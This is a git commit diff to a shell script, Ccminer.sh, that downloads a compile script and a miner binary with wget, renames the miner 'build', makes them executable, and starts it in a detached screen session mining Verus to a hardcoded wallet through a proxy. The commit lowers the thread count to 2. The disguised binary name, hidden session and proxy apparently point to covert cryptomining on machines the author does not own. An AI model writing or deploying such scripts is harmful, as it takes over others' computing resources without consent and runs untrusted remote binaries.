7d64909357edd8173bf836cb03658565dbca0411
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-10-29 18:23:38 +0700

    Update Ccminer.sh

--- Ccminer.sh
+++ Ccminer.sh
@@ -14,6 +14,6 @@ wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile
 wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p hybrid,xn=1 -t 2 -x $proxy
 ./compile.sh
 echo succes
